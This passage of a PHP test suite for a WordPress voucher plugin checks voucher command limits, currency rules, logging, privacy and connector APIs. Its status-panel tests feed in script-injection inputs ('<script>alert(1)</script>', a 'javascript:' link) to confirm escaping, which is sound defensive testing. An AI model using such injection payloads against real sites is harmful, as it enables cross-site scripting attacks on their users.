	$vc1->void( $vc1_args( array( 'voucher_id' => 42, 'run_id' => '' ) ) ),
);
$vc1_all = array_merge( $vc1_all, $vc1_bad );
$vc1_fields = array_map( static fn( $r ) => $r['code'] . ':' . $r['field'], $vc1_bad );
check( 'VC-2: own code, allow_weak, paid, percentage, e-mail address, code instead of id, refund switches, non-integer amounts, free-text keys and missing fields are refused (invalid_request with the field name)', array( 'invalid_request:code', 'invalid_request:allow_weak', 'invalid_request:paid', 'invalid_request:discount_type', 'invalid_request:recipient_email', 'invalid_request:code', 'invalid_request:refund', 'invalid_request:after_refund', 'invalid_request:amount_minor', 'invalid_request:target', 'invalid_request:reason', 'invalid_request:run_id' ) === $vc1_fields, implode( ', ', $vc1_fields ) );
$vc1_prod = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR', 'product_id' => 77 ) ) );
$vc1_cur  = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'USD' ) ) );
$vc1_nok  = $vc1->issue( array( 'idempotency_key' => str_repeat( 'k', 101 ) ) + $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR' ) ) );
array_push( $vc1_all, $vc1_prod, $vc1_cur, $vc1_nok );
check( 'VC-2: a percentage product is refused; the currency must be the shop currency; the key has at most 100 characters', 'percent_not_allowed' === $vc1_prod['code'] && 'currency_mismatch' === $vc1_cur['code'] && 'invalid_request' === $vc1_nok['code'] && 'idempotency_key' === $vc1_nok['field'] );
// F-05a (decided 23.11.2026): CHF/USD/GBP as shop currency get the number 100 without an entry; other currencies
// refuse amounts until the operator enters an own maximum.
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'CHF';
$vc1_be->currency = 'CHF';
$vc1_be->day      = '2026-11-17';
$vc1_chf  = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 10001, 'currency' => 'CHF' ) ) );
$vc1_chf1 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 10000, 'currency' => 'CHF' ) ) );
$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' ) ] = '90.00';
$vc1_be->day = '2026-11-18';
$vc1_chf2 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 9001, 'currency' => 'CHF' ) ) );
$vc1_chf3 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 9000, 'currency' => 'CHF' ) ) );
array_push( $vc1_all, $vc1_chf, $vc1_chf1, $vc1_chf2, $vc1_chf3 );
check( 'VC-3 F-05a: CHF shop – 100 CHF without an own entry (10001 refused, 10000 done); with an own maximum (90 CHF) above it refused, up to it done', 'amount_over_limit' === $vc1_chf['code'] && 'done' === $vc1_chf1['status'] && 'amount_over_limit' === $vc1_chf2['code'] && 'done' === $vc1_chf3['status'] );
check( 'VC-3 F-05a: in a CHF shop the saved maximum is clamped to 100.00 as in EUR', '100.00' === VCAP\API\V1\CommandLimits::sanitize_amount( 'vcap_command_issue_max_amount', '250' ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' ) ] );
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'SEK';
$vc1_be->currency = 'SEK';
$vc1_be->day      = '2026-11-19';
$vc1_sek  = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'SEK' ) ) );
$vc1_sekc = VCAP\API\V1\CommandLimits::sanitize_amount( 'vcap_command_issue_max_amount', '1100', true );
$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' ) ] = $vc1_sekc;
$vc1_sek2 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 110000, 'currency' => 'SEK' ) ) );
array_push( $vc1_all, $vc1_sek, $vc1_sek2 );
check( 'VC-3 F-05a: SEK shop (not in the list) – refused (currency_not_allowed, final) without an own maximum; the operator entry (1100 SEK, not clamped) allows it', 'currency_not_allowed' === $vc1_sek['code'] && true === $vc1_sek['final'] && '1100.00' === $vc1_sekc && 'done' === $vc1_sek2['status'] );
check( 'VC-3 F-05a: the list of currencies of similar value is CHF, USD, GBP', array( 'CHF', 'USD', 'GBP' ) === VCAP\API\V1\CommandLimits::SIMILAR_CURRENCIES );
unset( $GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' ) ] );
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'EUR';
$vc1_be->currency = 'EUR';
$vc1_be->day      = '2026-11-16';
// VC-12: credit and top-up hooks pass the ledger id of the booking as journal_id (contract 1.7.0).
$vc12_sc = (string) file_get_contents( VCAP_PATH . 'src/StoreCredit.php' );
$vc12_tu = (string) file_get_contents( VCAP_PATH . 'src/TopUp.php' );
check( 'VC-12: vcap_store_credit_changed (7th arg) and vcap_gift_card_topped_up (5th arg) pass array( journal_id => ledger id ); unknown bookings give 0', str_contains( $vc12_sc, "\$order_id, array( 'journal_id' => \$this->repo->last_log_id( (int) \$fresh->id, \$event ) ) );" ) && str_contains( $vc12_tu, "\$item, array( 'journal_id' => \$this->repo->last_log_id( (int) \$card->id, 'topup' ) ) );" ) && 0 === ( new ReflectionClass( VCAP\VoucherRepository::class ) )->newInstanceWithoutConstructor()->last_log_id( 999999, 'topup' ) );
// SET-WC-15: the limits as they apply now, for a display (contract 1.6.0).
$vc1_lim   = $vc1->limits();
$vc1_used  = count( array_filter( $vc1->protocol( '2026-11-16' ), static fn( $e ) => 'voucher.issue' === $e['command'] && 'done' === $e['status'] && empty( $e['replayed'] ) ) );
$vc1_sekl  = $vc1->limits( 'sek' );
$vc1_chfl  = $vc1->limits( 'CHF' );
check( 'SET-WC-15: limits() names day, currency and per command switch, fixed ceilings, effective limits and today\'s calls (used + remaining = per day)', '2026-11-16' === $vc1_lim['day'] && 'EUR' === $vc1_lim['currency'] && 'EUR' === $vc1_lim['shop_currency'] && 'EUR' === $vc1_lim['fixed_currency'] && false === $vc1_lim['similar_currency'] && VCAP\API\V1\CommandLimits::COMMANDS === array_keys( $vc1_lim['commands'] ) && VCAP\API\V1\CommandLimits::FIXED['voucher.issue'] === $vc1_lim['commands']['voucher.issue']['fixed'] && 10000 === $vc1_lim['commands']['voucher.issue']['effective']['max_amount_minor'] && $vc1_used === $vc1_lim['commands']['voucher.issue']['used_today'] && $vc1_used > 0 && $vc1_lim['commands']['voucher.issue']['effective']['per_day'] === $vc1_used + $vc1_lim['commands']['voucher.issue']['remaining_today'] && is_bool( $vc1_lim['commands']['voucher.void']['enabled'] ), wp_json_encode( $vc1_lim['commands']['voucher.issue'] ) );
check( 'SET-WC-15: limits( currency ) shows F-05a – SEK amounts refused in an EUR shop, CHF counts as similar; commands without amount stay allowed', 'SEK' === $vc1_sekl['currency'] && false === $vc1_sekl['commands']['voucher.issue']['effective']['amount_allowed'] && null === $vc1_sekl['commands']['voucher.redeem']['effective']['max_amount_minor'] && true === $vc1_sekl['commands']['voucher.void']['effective']['amount_allowed'] && true === $vc1_chfl['similar_currency'] );
check( 'SET-WC-15: limits() holds no code, e-mail address or per-recipient counter', ! preg_match( '/MARKER|@|recipient:/', wp_json_encode( array( $vc1_lim, $vc1_sekl ) ) ) );
check( 'VC-1: settings sanitise to the table (count clamped, EUR amount at most 100.00, negative/blank = default)', '50' === VCAP\API\V1\CommandLimits::sanitize_count( 'vcap_command_void_per_day', '75' ) && '3' === VCAP\API\V1\CommandLimits::sanitize_count( 'vcap_command_void_per_day', '3' ) && '1' === VCAP\API\V1\CommandLimits::sanitize_count( 'vcap_command_issue_per_recipient', '9' ) && '100.00' === VCAP\API\V1\CommandLimits::sanitize_amount( 'vcap_command_issue_max_amount', '250' ) && '40.50' === VCAP\API\V1\CommandLimits::sanitize_amount( 'vcap_command_redeem_max_amount', '40,5' ) && '' === VCAP\API\V1\CommandLimits::sanitize_amount( 'vcap_command_redeem_max_amount', '-1' ) );
$vc1_set = VCAP\API\V1\CommandService::settings_fields( array(), 'api' );
check( 'VC-1: the switches are in "Integrations (API)", default "no"', 4 === count( array_filter( $vc1_set, static fn( $f ) => 'checkbox' === ( $f['type'] ?? '' ) && 'no' === $f['default'] && str_ends_with( $f['id'], '_enabled' ) ) ) && array() === VCAP\API\V1\CommandService::settings_fields( array(), 'codes' ) );
// Switching off again is final for the next calls; a replay of a done call stays done.
$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'enabled' ) ] = 'no';
$vc1_off2 = $vc1->issue( $vc1_args( array( 'recipient_user_id' => 22, 'amount_minor' => 100, 'currency' => 'EUR' ) ) );
$vc1_rep2 = $vc1->issue( $vc1_i_args );
check( 'VC-1: switched off – new calls refused (command_disabled), a replay still returns the stored reply', 'command_disabled' === $vc1_off2['code'] && 'done' === $vc1_rep2['status'] && true === $vc1_rep2['replayed'] );
$vc1_on( array( 'voucher.issue' ) );
// Lock busy.
$vc1_store->lock_ok = false;
$vc1_busy = $vc1->void( $vc1_args( array( 'voucher_id' => 102 ) ) );
$vc1_store->lock_ok = true;
check( 'VC-1: lock busy – status failed (not final, may be retried with the same key), nothing stored or executed', 'failed' === $vc1_busy['status'] && 'busy' === $vc1_busy['code'] && false === $vc1_busy['final'] && 'active' === $vc1_be->vouchers[102]->status );
check( 'VC-1: executions run under the lock and the lock is always released', $vc1_be->locked_seen && ! $vc1_store->locked );
// Protocol and history (R-8.3c).
$vc1_log = $vc1->protocol( '2026-11-16' );
check( 'VC-1: every call is in the protocol – also refusals, conflicts, replays and lock failures – with the documented keys', count( $vc1_log ) >= 40 && array() === array_filter( $vc1_log, static fn( $e ) => VCAP\API\V1\CommandService::PROTOCOL_KEYS !== array_keys( $e ) ) && in_array( 'idempotency_conflict', array_column( $vc1_log, 'code' ), true ) && in_array( true, array_column( $vc1_log, 'replayed' ), true ) && in_array( 'busy', array_column( $vc1_log, 'code' ), true ) && in_array( 'command_disabled', array_column( $vc1_log, 'code' ), true ) );
$vc1_e = array_values( array_filter( $vc1_log, static fn( $e ) => 'issued' === $e['code'] ) )[0] ?? array();
check( 'VC-1: a protocol entry names command, workflow, run, step, voucher, amount, result, time and the authorising user; the key only as a short hash', 'voucher.issue' === ( $vc1_e['command'] ?? '' ) && '3' === $vc1_e['workflow_id'] && str_starts_with( (string) $vc1_e['run_id'], 'run-' ) && 'step-1' === $vc1_e['step_id'] && 500 === $vc1_e['voucher_id'] && 2550 === $vc1_e['amount_minor'] && 7 === $vc1_e['authorized_by_user_id'] && 'loyalty_reward' === $vc1_e['reason'] && 16 === strlen( (string) $vc1_e['key_hash'] ) && (bool) preg_match( '/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/', (string) $vc1_e['at'] ) );
$vc1_h = array_map( static fn( $h ) => array( $h[0], VCAP\Note::decode( $h[2] ) ), $vc1_be->history );
$vc1_h_void = array_values( array_filter( $vc1_h, static fn( $h ) => 100 === $h[0] ) );
$vc1_h_ref  = array_values( array_filter( $vc1_h, static fn( $h ) => 43 === $h[0] && 'voided_after_refund' === ( $h[1]['args'][2] ?? '' ) ) );
check( 'VC-1: calls on a known voucher get a history entry (coded note: command, result, code, workflow, run, step, user, reason) – also refusals; replays do not', 1 === count( $vc1_h_void ) && 'vcap_command' === $vc1_h_void[0][1]['code'] && array( 'voucher.void', 'done', 'voided', '3' ) === array_slice( $vc1_h_void[0][1]['args'], 0, 4 ) && 1 === count( $vc1_h_ref ) && 1 === count( array_filter( $vc1_h, static fn( $h ) => 500 === $h[0] ) ) );
check( 'VC-1: the history note is translated through vcap_note_text with an event label', str_starts_with( (string) VCAP\API\V1\CommandService::note_text( '', 'vcap_command', array( 'voucher.void', 'done', 'voided', '3', 'r', 's', '7', 'x' ) ), 'voucher.void: done (voided)' ) && 'Automatic command' === VCAP\API\V1\CommandService::event_label( array() )['command'] );
$vc1_json   = strtolower( (string) wp_json_encode( array( $vc1_all, $vc1_log, $vc1_be->history ) ) );
$vc1_leaked = array_values( array_filter( array( 'markercmd-', 'marker.recipient@example.test', 'marker.two@example.test', 'marker recipient', 'marker.cmd@example.test', 'wf-3:v2:evt-' ), static fn( $s ) => str_contains( $vc1_json, $s ) ) );
check( 'VC-1: no voucher code, address, name or raw idempotency key in any reply, protocol entry or history note', array() === $vc1_leaked, implode( ', ', $vc1_leaked ) );
check( 'VC-1: money in minor units – amount_minor and balance_minor are integers in every reply', array() === array_filter( $vc1_all, static fn( $r ) => ( null !== $r['amount_minor'] && ! is_int( $r['amount_minor'] ) ) || ( null !== $r['balance_minor'] && ! is_int( $r['balance_minor'] ) ) ) );
check( 'VC-1: refusals are final, only failed is not; status is one of done, duplicate, refused, failed', array() === array_filter( $vc1_all, static fn( $r ) => ! in_array( $r['status'], VCAP\API\V1\CommandService::STATUSES, true ) || ( 'failed' === $r['status'] ) === $r['final'] ) );
// OptionCommandStore on the option stubs: replies, counters, protocol, clean-up.
$vc1_saved_wpdb  = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new VCAP_Test_Wpdb();
$GLOBALS['wpdb']->answers = array( '/GET_LOCK/' => '1', '/RELEASE_LOCK/' => '1' );
$vc1_os = new VCAP\API\V1\OptionCommandStore();
$vc1_os_ok = $vc1_os->lock();
$vc1_os->save_reply( 'k-1', 'h', array( 'status' => 'done' ), '2026-01-01' );
$vc1_os->increment( '2026-01-01', array( 'voucher.void', 'voucher.void' ) );
$vc1_os->protocol( '2026-01-01', array( 'code' => 'voided' ) );
$vc1_os_before = array( $vc1_os->reply( 'k-1' ), $vc1_os->count( '2026-01-01', 'voucher.void' ), count( $vc1_os->entries( '2026-01-01' ) ) );
$vc1_os->save_reply( 'k-2', 'h2', array( 'status' => 'refused' ), '2026-11-16' );
$vc1_os->unlock();
check( 'VC-1: OptionCommandStore – named lock per site, replies by key hash (not autoloaded), counters per day, protocol; days older than 90 days are removed', $vc1_os_ok && array( array( 'hash' => 'h', 'result' => array( 'status' => 'done' ) ), 2, 1 ) === $vc1_os_before && null === $vc1_os->reply( 'k-1' ) && 0 === $vc1_os->count( '2026-01-01', 'voucher.void' ) && array( 'hash' => 'h2', 'result' => array( 'status' => 'refused' ) ) === $vc1_os->reply( 'k-2' ) && false === ( $GLOBALS['vcap_test_autoload'][ 'vcap_cmd_reply_' . sha1( 'k-2' ) ] ?? null ) && ! isset( $GLOBALS['vcap_test_options']['vcap_cmd_reply_k-2'] ) && (bool) preg_grep( '/RELEASE_LOCK/', $GLOBALS['wpdb']->log ) );
$GLOBALS['wpdb'] = $vc1_saved_wpdb;
// Contract and docs.
require_once VCAP_PATH . 'src/functions.php';
$vc1_unready = vcap_command_void( array() );
check( 'VC-1: without vcap()->commands the functions answer failed/unavailable (not final) instead of failing', 'failed' === $vc1_unready['status'] && 'unavailable' === $vc1_unready['code'] && VCAP\API\V1\CommandService::RESULT_KEYS === array_keys( $vc1_unready ) );
$vc1_main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
$vc1_api  = (string) file_get_contents( VCAP_PATH . 'API.md' );
preg_match( "/define\( 'VCAP_CONTRACT_VERSION', '(\d+\.\d+\.\d+)' \);/", $vc1_main, $vc1_contract );
check( 'VC-1: contract 1.3.0 (additive minor), documented in API.md and CONNECTORS.md; Plugin exposes vcap()->commands', isset( $vc1_contract[1] ) && version_compare( $vc1_contract[1], '1.3.0', '>=' ) && str_starts_with( $vc1_contract[1], '1.' ) && str_contains( $vc1_api, '## Voucher commands (since 1.3.0, contract 1.3.0)' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'CONNECTORS.md' ), '| 1.3.0 | 1.3.0 | voucher commands' ) && property_exists( VCAP\Plugin::class, 'commands' ) && 4 === count( array_filter( array( 'vcap_command_issue', 'vcap_command_void', 'vcap_command_reactivate', 'vcap_command_redeem' ), static fn( $f ) => function_exists( $f ) && str_contains( $vc1_api, '`' . $f . '( array $args )`' ) ) ) );
$GLOBALS['vcap_test_options'] = $vc1_saved_opts;

// VC-10 (R-4.7): the card import reference has no relation to the code.
echo "\nVC-10: card import reference without the code\n";
$vc10_a   = VCAP\Admin\CardImport::reference();
$vc10_b   = VCAP\Admin\CardImport::reference();
$vc10_src = (string) file_get_contents( VCAP_PATH . 'src/Admin/CardImport.php' );
check( 'VC-10: the reference is random ("import:<uuid>"), differs per call and is not derived from the code (no hash of it in the source)', (bool) preg_match( '/^import:[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/', $vc10_a ) && $vc10_a !== $vc10_b && 0 === ( new ReflectionMethod( VCAP\Admin\CardImport::class, 'reference' ) )->getNumberOfParameters() && ! preg_match( '/md5\(\s*strtolower\(\s*\$code|sha1\(\s*\$code|hash\([^)]*\$code/', $vc10_src ) && str_contains( $vc10_src, "'reference'       => self::reference()," ) && ! str_contains( $vc10_src, 'reference "import:<code>"' ) );
check( 'VC-10: a second import stays idempotent through the code (entry "imported" → skipped, other existing code → taken), imports before VC-10 are recognised the same way', str_contains( $vc10_src, "has_event( \$existing->id, self::EVENT )" ) && str_contains( $vc10_src, 'Cards imported before VC-10 keep their old reference' ) );

// Suite task "Providerstatus … in Suite-Admins anzeigen": optional Workflow Captain status in the settings.
echo "\nWorkflow Captain status (optional)\n";
$wfc_missing = VCAP\Compat\WorkflowCaptain::status_html();
check( 'Workflow Captain: without workflow_captain_status_for() the section says "not active" in one sentence, without links or licence wording', ! function_exists( 'workflow_captain_status_for' ) && null === VCAP\Compat\WorkflowCaptain::status() && str_starts_with( $wfc_missing, 'Not active' ) && ! str_contains( $wfc_missing, 'href=' ) && ! preg_match( '/licen[cs]e|premium|\bpro\b|upgrade|buy/i', $wfc_missing ) );
$wfc_asked = array();
$wfc_base  = 'https://example.test/wp-admin/admin.php';
$wfc_html  = VCAP\Compat\WorkflowCaptain::status_html(
	static function ( string $product ) use ( &$wfc_asked, $wfc_base ): array {
		$wfc_asked[] = $product;
		return array(
			'version'             => 1,
			'product'             => $product,
			'adapter'             => 'registered',
			'reason'              => null,
			'contract_version'    => '1.3.0',
			'active_workflows'    => 2,
			'events'              => array( 'done' => 7, 'retry_wait' => 1 ),
			'last_correlation_id' => 'c-1"><script>alert(1)</script>',
			'links'               => array(
				'workflows' => $wfc_base . '?page=workflow-captain-workflows',
				'runs'      => $wfc_base . '?page=workflow-captain-runs',
				'events'    => $wfc_base . '?page=workflow-captain-events&product=voucher-captain',
				'providers' => 'javascript:alert(1)',
			),
		);
	}
);
check( 'Workflow Captain: asks for the product voucher-captain and shows adapter, contract version, active workflows and events per state', array( 'voucher-captain' ) === $wfc_asked && str_contains( $wfc_html, 'Adapter: registered' ) && str_contains( $wfc_html, 'Contract version: 1.3.0' ) && str_contains( $wfc_html, 'Active workflows: 2' ) && str_contains( $wfc_html, 'done: 7' ) && str_contains( $wfc_html, 'waiting for retry: 1' ) );
check( 'Workflow Captain: each state links to the event list with product and state filter', str_contains( $wfc_html, 'product=voucher-captain&state=retry_wait' ) && str_contains( $wfc_html, 'product=voucher-captain&state=done' ) );
check( 'Workflow Captain: the last correlation ID is escaped and links to the events of Voucher Captain', ! str_contains( $wfc_html, '<script>' ) && str_contains( $wfc_html, '<code>c-1&quot;&gt;&lt;script&gt;' ) && str_contains( $wfc_html, 'product=voucher-captain"><code>' ) );
check( 'Workflow Captain: links to workflows, runs and events; a link that is not http(s) is dropped', str_contains( $wfc_html, 'page=workflow-captain-workflows' ) && str_contains( $wfc_html, 'page=workflow-captain-runs' ) && ! str_contains( $wfc_html, 'javascript:' ) && ! str_contains( $wfc_html, '>Providers<' ) );
$wfc_refused = VCAP\Compat\WorkflowCaptain::status_html( static fn() => array( 'adapter' => 'refused', 'reason' => 'major <b>2</b>', 'contract_version' => null, 'active_workflows' => 0, 'events' => array(), 'last_correlation_id' => null, 'links' => array() ) );
check( 'Workflow Captain: a refused adapter shows its escaped reason, "none yet" and no links', str_contains( $wfc_refused, 'Adapter: refused (major &lt;b&gt;2&lt;/b&gt;)' ) && str_contains( $wfc_refused, 'none yet' ) && str_contains( $wfc_refused, 'Contract version: —' ) && ! str_contains( $wfc_refused, 'href=' ) );
check( 'Workflow Captain: a missing adapter and a status function returning null are reported', str_contains( VCAP\Compat\WorkflowCaptain::status_html( static fn() => array( 'adapter' => 'missing' ) ), 'Adapter: not registered' ) && str_contains( VCAP\Compat\WorkflowCaptain::status_html( static fn() => null ), 'does not report a status yet' ) );
if ( ! function_exists( 'workflow_captain_status_for' ) ) {
	function workflow_captain_status_for( string $product ): ?array { // Declared here so it exists only from now on.
		return array( 'product' => $product, 'adapter' => 'registered', 'contract_version' => '1.3.0', 'active_workflows' => 0, 'events' => array(), 'last_correlation_id' => null, 'links' => array() );
	}
}
$wfc_settings = (string) file_get_contents( VCAP_PATH . 'src/Settings.php' );
check( 'Workflow Captain: with the function the status is read by default; the "Integrations (API)" settings section shows it', VCAP\Compat\WorkflowCaptain::available() && 'voucher-captain' === ( VCAP\Compat\WorkflowCaptain::status()['product'] ?? '' ) && str_contains( VCAP\Compat\WorkflowCaptain::status_html(), 'Adapter: registered' ) && str_contains( $wfc_settings, "'desc'  => Compat\\WorkflowCaptain::status_html()," ) );


// VOUCH-E17-02: connector access on vcap()->api_v1 (contract 1.4.0) – project connectors need no internal class.
$e17_saved_wpdb  = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new class() {
	public string $prefix = 'wp_';
	public int $insert_id = 0;
	public array $log      = array();
	public array $inserted = array();
	public bool $fail      = false;
	public array $rows     = array();
	public function prepare( $query, ...$args ) {
		$args = isset( $args[0] ) && is_array( $args[0] ) ? $args[0] : $args;
		return vsprintf( str_replace( array( '%d', '%s', '%i' ), array( '%d', "'%s'", '%s' ), $query ), $args );
	}
	public function get_row( $q, $o = null ) {
		$this->log[] = $q;
		foreach ( $this->rows as $row ) {
			if ( str_contains( $q, "WHERE id = '" . $row['id'] . "'" ) || str_contains( $q, "WHERE code = '" . $row['code'] . "'" ) ) {
				return $row;
			}
		}
		return null;
	}
	public function get_var( $q ) { $this->log[] = $q; return null; }
	public function get_results( $q, $o = null ) { $this->log[] = $q; return array(); }
	public function get_col( $q, $i = 0 ) { $this->log[] = $q; return array(); }
	public function query( $q ) { $this->log[] = $q; return 1; }
	public function insert( $table, $row ) {
		if ( $this->fail ) {
			return false;
		}
		$this->inserted[] = array( $table, $row );
		$this->insert_id  = count( $this->inserted );
		return 1;
	}
};
$GLOBALS['wpdb']->rows = array(
	array( 'id' => '81', 'code' => 'COURSE-7Q2XK9', 'coupon_id' => '0', 'type' => 'course', 'status' => 'active', 'order_id' => '1081', 'order_item_id' => '17', 'item_index' => '0', 'product_id' => '55', 'variation_id' => '56', 'template_id' => '0', 'usage_mode' => 'single', 'discount_type' => 'fixed_cart', 'initial_amount' => '40.0000', 'balance' => '40.0000', 'currency' => 'EUR', 'expires_at' => '2029-12-31 23:59:59', 'buyer_name' => 'Marker Buyer', 'buyer_email' => 'marker.buyer@example.test', 'user_id' => '9', 'recipient_name' => 'Marker Recipient', 'recipient_email' => 'marker.recipient@example.test', 'message' => 'MARKER MESSAGE', 'fields' => '[]', 'send_to' => 'buyer', 'delivery_at' => null, 'delivered_at' => null, 'token' => 'markertoken0123456789abcdef0123456789abcdef012345', 'transferable' => '1', 'terms' => 'MARKER TERMS', 'max_checkins' => '1', 'checkins' => '0', 'last_checkin_at' => null, 'created_at' => '2026-11-20 08:00:00', 'updated_at' => '2026-11-20 08:00:00' ),
);
VCAP\VoucherRepository::forget();
$e17_api = new VCAP\API\V1\VoucherService( new VCAP\VoucherRepository(), ( new ReflectionClass( VCAP\CouponManager::class ) )->newInstanceWithoutConstructor() );
$e17_v   = $e17_api->voucher( 81 );
check( 'VOUCH-E17-02: voucher() returns the documented keys in order, with code, target product and order line', is_array( $e17_v ) && VCAP\API\V1\VoucherService::CONNECTOR_VOUCHER_KEYS === array_keys( $e17_v ) && 81 === $e17_v['id'] && 'COURSE-7Q2XK9' === $e17_v['code'] && 'course' === $e17_v['type'] && false === $e17_v['multi_use'] && 40.0 === $e17_v['value'] && 17 === $e17_v['order_item_id'] && 55 === $e17_v['product_id'] && 56 === $e17_v['variation_id'] && 9 === $e17_v['user_id'] && '2029-12-31 23:59:59' === $e17_v['expires'] && '2026-11-20 08:00:00' === $e17_v['created'], wp_json_encode( $e17_v ) );
$e17_json = strtolower( (string) wp_json_encode( $e17_v ) );
check( 'VOUCH-E17-02: voucher() carries no token, name, address, message or terms', ! preg_match( '/marker|token0123/', $e17_json ) );
check( 'VOUCH-E17-02: voucher() answers null for an unknown, zero or negative id', null === $e17_api->voucher( 82 ) && null === $e17_api->voucher( 0 ) && null === $e17_api->voucher( -81 ) );
VCAP\VoucherRepository::forget();
$e17_by = array( $e17_api->voucher_by_code( 'course-7q2xk9' ), $e17_api->voucher_by_code( ' COURSE-7Q2XK9 ' ), $e17_api->voucher_by_code( 'COURSE-7Q2XK9#1234' ) );
check( 'VOUCH-E17-02: voucher_by_code() finds the voucher case-insensitively, trimmed and with a #PIN suffix; same array as voucher()', $e17_by === array( $e17_v, $e17_v, $e17_v ) );
check( 'VOUCH-E17-02: voucher_by_code() answers null for an unknown, empty or overlong code', null === $e17_api->voucher_by_code( 'NOPE-0000' ) && null === $e17_api->voucher_by_code( '' ) && null === $e17_api->voucher_by_code( str_repeat( 'A', 101 ) ) );
$e17_ok = $e17_api->log_event( 81, 'learnboating_granted', '<b>Course 55</b> granted', 1081 );
$e17_in = $GLOBALS['wpdb']->inserted[0] ?? array( '', array() );
check( 'VOUCH-E17-02: log_event() writes the connector event with the plain-text note and order into the voucher history', true === $e17_ok && 'wp_vcap_events' === $e17_in[0] && 81 === $e17_in[1]['voucher_id'] && 'learnboating_granted' === $e17_in[1]['event'] && 'Course 55 granted' === $e17_in[1]['note'] && 1081 === $e17_in[1]['order_id'] && null === $e17_in[1]['amount'] && null === $e17_in[1]['balance_after'], wp_json_encode( $e17_in ) );
$e17_long = $e17_api->log_event( 81, 'learnboating_failed', str_repeat( 'x', 600 ) );
check( 'VOUCH-E17-02: log_event() cuts the note to 500 characters', true === $e17_long && 500 === mb_strlen( (string) ( $GLOBALS['wpdb']->inserted[1][1]['note'] ?? '' ) ) );
$e17_bad = array();
foreach ( array( 'redeemed', 'api_committed', 'voided', 'topup', 'vcap_custom', 'voucher_x', 'passcaptain_tickets', 'wc_thing', 'granted', 'Learnboating_granted', 'learnboating-granted', 'learnboating_', '_granted', 'learnboating__granted', 'learnboating granted', 'lb_' . str_repeat( 'a', 62 ) ) as $e17_event ) {
	$e17_r = $e17_api->log_event( 81, $e17_event );
	if ( ! ( $e17_r instanceof WP_Error && 'vcap_invalid_event' === $e17_r->get_error_code() ) || VCAP\API\V1\VoucherService::connector_event( $e17_event ) ) {
		$e17_bad[] = $e17_event;
	}
}
check( 'VOUCH-E17-02: log_event() refuses core events, reserved prefixes and malformed names (vcap_invalid_event), connector_event() agrees', array() === $e17_bad && 2 === count( $GLOBALS['wpdb']->inserted ) && VCAP\API\V1\VoucherService::connector_event( 'learnboating_revoked' ) && VCAP\API\V1\VoucherService::connector_event( 'lb2_access_granted_2' ), implode( ', ', $e17_bad ) );
$e17_unknown = $e17_api->log_event( 4711, 'learnboating_granted' );
$GLOBALS['wpdb']->fail = true;
$e17_failed  = $e17_api->log_event( 81, 'learnboating_granted' );
$GLOBALS['wpdb']->fail = false;
check( 'VOUCH-E17-02: log_event() reports an unknown voucher and a failed insert', $e17_unknown instanceof WP_Error && 'vcap_unknown_voucher' === $e17_unknown->get_error_code() && $e17_failed instanceof WP_Error && 'vcap_log_failed' === $e17_failed->get_error_code() );
check( 'VOUCH-E17-02: admin_url() points to the voucher on the Voucher Captain screen', 'https://shop.test/wp-admin/admin.php?page=vcap-vouchers&voucher=81' === $e17_api->admin_url( 81 ) && str_ends_with( $e17_api->admin_url( -3 ), 'voucher=0' ) );
$GLOBALS['vcap_test_item_meta'][17]['_vcap_line'] = array( 'face_value' => 40.0, 'channels' => array( 'external' ), 'learnboating' => array( 'product_id' => 7, 'variation_id' => 0 ) );
$GLOBALS['vcap_test_item_meta'][18]['_vcap_line'] = 'broken';
check( 'VOUCH-E17-02: line_snapshot() returns the stored line snapshot with connector keys; [] for a missing, broken or invalid line', array( 'product_id' => 7, 'variation_id' => 0 ) === ( $e17_api->line_snapshot( 17 )['learnboating'] ?? null ) && array() === $e17_api->line_snapshot( 18 ) && array() === $e17_api->line_snapshot( 19 ) && array() === $e17_api->line_snapshot( 0 ) );
unset( $GLOBALS['vcap_test_item_meta'][17], $GLOBALS['vcap_test_item_meta'][18] );
$GLOBALS['wpdb'] = $e17_saved_wpdb;
VCAP\VoucherRepository::forget();
// Every event Voucher Captain writes itself is reserved: literal log() events, *_EVENT constants and the core labels.
$e17_src = '';
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( VCAP_PATH . 'src', FilesystemIterator::SKIP_DOTS ) ) as $e17_file ) {
	if ( str_ends_with( (string) $e17_file, '.php' ) && ! str_contains( (string) $e17_file, '/vendor' ) ) {
		$e17_src .= (string) file_get_contents( (string) $e17_file );
	}
}
preg_match_all( "/->log\(\s*[^,]+,\s*'([a-z_]+)'/", $e17_src, $e17_m1 );
preg_match_all( "/(?:const [A-Z_]*EVENT|const EVENT)\s*=\s*'([a-z][a-z_]*)'/", $e17_src, $e17_m2 );
